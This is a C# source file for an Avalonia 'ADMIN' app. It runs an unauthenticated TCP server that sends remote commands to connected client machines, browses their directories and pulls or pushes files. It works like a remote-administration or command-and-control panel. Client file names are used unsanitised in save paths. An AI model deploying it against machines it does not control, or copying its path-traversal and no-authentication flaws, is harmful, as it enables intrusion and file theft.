using System;
using System.Collections.Concurrent;
using System.Collections.ObjectModel;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using ADMIN.ViewModels;
using Avalonia.Threading;
using CommunityToolkit.Mvvm.ComponentModel;
using Tmds.DBus.Protocol;
using DotNetEnv;
using System.Linq;
using SkiaSharp;

namespace ADMIN.ViewModels
{
    public partial class MainWindowViewModel : ViewModelBase
    {
        public ObservableCollection<string> ConnectedClients { get; set; } = new ObservableCollection<string>();
        public ObservableCollection<string> ServerLogs { get; set; } = new ObservableCollection<string>();
        
        private ConcurrentDictionary<string, TcpClient> _clientConnections = new();
        private NetworkStream _stream;
        public MainWindowViewModel()
        {
            DotNetEnv.Env.Load();
            _ = StartServer();
        }

        // Function to start the server and accept incoming clients
        private async Task StartServer()
        {
            try
            {
                string serverPortStr = Environment.GetEnvironmentVariable("SERVER_PORT") ?? "2025";
                int port = int.TryParse(serverPortStr, out int p) ? p : 2025;
                TcpListener listener = new TcpListener(IPAddress.Any, port);
                listener.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                listener.Start();

                while (true)
                {
                    TcpClient client = await listener.AcceptTcpClientAsync();
                    _stream = client.GetStream();
                    _ = HandleClientAsync(client); // fire-and-forget
                }
            }
            catch (Exception ex)
            {
                ServerLogs.Insert(0,$"Error: {ex.Message}");
            }
        }

        private async Task HandleClientAsync(TcpClient client)
        {
            string clientIp = ((IPEndPoint)client.Client.RemoteEndPoint)?.Address.ToString();
            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[1024];

            try
            {
                // Add the client to the dictionary
                _clientConnections[clientIp] = client;

                // Continuously read messages from the client
                while (true)
                {
                    int length = await stream.ReadAsync(buffer, 0, buffer.Length);
                    if (length <= 0)
                    {
                        // Client disconnected or no data received, break the loop
                        break;
                    }

                    string clientMessage = Encoding.UTF8.GetString(buffer, 0, length);

                    // Update the UI with the client message
                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                        string entry = $"{clientIp}: {clientMessage}";

                        if (clientMessage.StartsWith("pathlist:"))
                        {
                            // Add the entry to ServerLogs without duplicating in ConnectedClients
                            ServerLogs.Insert(0, entry);
                        }
                        else if (clientMessage.StartsWith("fileDownload:"))
                        {
                            try
                            {
                                // Parse the header
                                string[] parts = clientMessage.Substring("fileDownload:".Length).Split(':');
                                if (parts.Length == 2)
                                {
                                    string fileName = parts[0];
                                    if (int.TryParse(parts[1], out int fileSize))
                                    {
                                        // Get the stream from the client connection
                                        NetworkStream clientStream = client.GetStream();

                                        // Create a buffer to read file content
                                        byte[] fileBuffer = new byte[fileSize];
                                        int totalBytesRead = 0;
                                        int bytesRead;

                                        // Read the file content from the client stream
                                        while (totalBytesRead < fileSize &&
                                               (bytesRead = clientStream.Read(fileBuffer, totalBytesRead, fileSize - totalBytesRead)) > 0)
                                        {
                                            totalBytesRead += bytesRead;
                                        }

                                        // Save the file to the server's file system
                                        string savePath = Path.Combine("file_downloaded", fileName);
                                        Directory.CreateDirectory("file_downloaded"); // Ensure the directory exists
                                        File.WriteAllBytes(savePath, fileBuffer);

                                        // Log success
                                        ServerLogs.Insert(0, $"File '{fileName}' downloaded successfully. Saved to: {savePath}");
                                    }
                                    else
                                    {
                                        ServerLogs.Insert(0, "Invalid file size received.");
                                    }
                                }
                                else
                                {
                                    ServerLogs.Insert(0, "Invalid file download header format.");
                                }
                            }
                            catch (Exception ex)
                            {
                                ServerLogs.Insert(0, $"Error downloading file: {ex.Message}");
                            }
                        }
                        else
                        {
                            // Add the entry to ConnectedClients and log it if not a pathlist message
                            if (!ConnectedClients.Contains(entry))
                            {
                                ConnectedClients.Insert(0, $"[{timestamp}] {entry}");
                                AppendMessageToLogAsync($"[{timestamp}] {entry}");
                            }
                        }

                        ReverseCollection();
                    });
                }
            }
            catch (Exception ex)
            {
                    ServerLogs.Insert(0, $"Client Error: {ex.Message}");
            }
            finally
            {
                // Remove the client from the dictionary upon disconnect
                _clientConnections.TryRemove(clientIp, out _);
            }
        }


        private void ReverseCollection()
        {
            // Reverse the collection and clear and refill the ObservableCollection
            var limitedClients = ConnectedClients.Reverse().Take(100).ToList();

            ConnectedClients.Clear();
            foreach (var client in limitedClients)
            {
                ConnectedClients.Insert(0, client);
            }
        }

        // Send a message to a specific client
        public async Task SendMessageAsync(string ipAddress, string message)
        {
            if (_clientConnections.TryGetValue(ipAddress, out TcpClient client))
            {
                try
                {
                    var stream = client.GetStream();
                    byte[] messageBytes = Encoding.UTF8.GetBytes($"cmd:{message}");
                    await stream.WriteAsync(messageBytes, 0, messageBytes.Length);

                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        ServerLogs.Insert(0,  $"Command Sent to {ipAddress}: {message}");
                    });
                }
                catch (Exception ex)
                {
            
                        ServerLogs.Insert(0, $"Send failed to {ipAddress}: {ex.Message}");
                }
            }
            else
            {
                
                ServerLogs.Insert(0, $"Client {ipAddress} not found.");
            }
        }
        public async Task ViewDirectories(string ipAddress, string path)
        {
            if (_clientConnections.TryGetValue(ipAddress, out TcpClient client))
            {
                try
                {
                    var stream = client.GetStream();
                    byte[] messageBytes = Encoding.UTF8.GetBytes($"__open_file:{path}");
                    await stream.WriteAsync(messageBytes, 0, messageBytes.Length);

                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        ServerLogs.Insert(0, $"Command Sent to {ipAddress}: {path}");
                    });
                }
                catch (Exception ex)
                {
                  
                        ServerLogs.Insert(0, $"Send failed to {ipAddress}: {ex.Message}");
                }
            }
            else
            {
                ServerLogs.Insert(0, $"Client {ipAddress} not found.");
            }
        }
        public async Task DownloadFile(string ipAddress, string path)
        {
            if (_clientConnections.TryGetValue(ipAddress, out TcpClient client))
            {
                try
                {
                    var stream = client.GetStream();
                    byte[] messageBytes = Encoding.UTF8.GetBytes($"__download_file:{path}");
                    await stream.WriteAsync(messageBytes, 0, messageBytes.Length);

                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        ServerLogs.Insert(0, $"Command Sent to {ipAddress}: {path}");
                    });
                }
                catch (Exception ex)
                {
                    ServerLogs.Insert(0, $"Send failed to {ipAddress}: {ex.Message}");
                }
            }
            else
            {
                ServerLogs.Insert(0, $"Client {ipAddress} not found.");
            }
        }
        public async Task UploadFile(string ipAddress, string attachment)
        {
            if (_clientConnections.TryGetValue(ipAddress, out TcpClient client))
            {
                try
                {
                    // Read file content
                    byte[] fileBytes = await File.ReadAllBytesAsync(attachment);

                    // Send file metadata (header)
                    string header = $"__upload_file:{Path.GetFileName(attachment)}:{fileBytes.Length}\n";
                    byte[] headerBytes = Encoding.UTF8.GetBytes(header);
                    await _stream.WriteAsync(headerBytes, 0, headerBytes.Length);

                    // Send file content
                    await _stream.WriteAsync(fileBytes, 0, fileBytes.Length);

                    // Flush the stream
                    await _stream.FlushAsync();
                    ServerLogs.Insert(0, $"Send sent file to {ipAddress}: {attachment}");
                }
                catch (Exception ex)
                {
                        ServerLogs.Insert(0, $"Send failed to {ipAddress}: {ex.Message}");
                }
            }
            else
            {
                ServerLogs.Insert(0, $"Client {ipAddress} not found.");
            }
        }

        public async Task ExportTxt()
        {
            try
            {
                // Define the folder path and file name with a timestamp
                string folderPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Logs");
                string timestamp = DateTime.Now.ToString("yyyyMMddHHmmss");
                string filePath = Path.Combine(folderPath, $"Log-{timestamp}.txt");

                // Create the folder if it doesn't exist
                if (!Directory.Exists(folderPath))
                {
                    Directory.CreateDirectory(folderPath);
                }

                // Create a StreamWriter to write to the file
                using (StreamWriter writer = new StreamWriter(filePath))
                {
                    // Iterate through the ObservableCollection and write each item to the file
                    foreach (var client in ConnectedClients)
                    {
                        writer.WriteLine(client);
                    }
                }

                // Optionally notify that the export was successful
                Console.WriteLine("Log exported successfully!");
                ServerLogs.Insert(0, $"[SUCCESS] Log file path: {filePath}");

            }
            catch (IOException ex)
            {
                // Handle any exceptions (e.g., file write errors)
                Console.WriteLine($"Error exporting log: {ex.Message}");
                ServerLogs.Insert(0, $"[FAILED] Export Failed: {ex.Message}");
            }

        }
        public void AppendMessageToLogAsync(string message)
        {
            try
            {
                // Get today's date string in yyyymmdd format
                string dateStr = DateTime.Now.ToString("yyyyMMdd");

                // Build file path (adjust folder as needed)
                string logFileName = $"log-{dateStr}.txt";
                string logFolder = "logs";  // e.g., a "logs" folder in your app directory
                Directory.CreateDirectory(logFolder); // ensure folder exists

                string logFilePath = Path.Combine(logFolder, logFileName);

                // Prepare the line to write (timestamp + message)
                string line = $"{message}{Environment.NewLine}";

                File.AppendAllText(logFilePath, line);

            }
            catch (Exception ex)
            {
                // Handle exceptions as needed (log or show error)
                Console.WriteLine($"Failed to write log: {ex.Message}");
            }
        }

    }
}
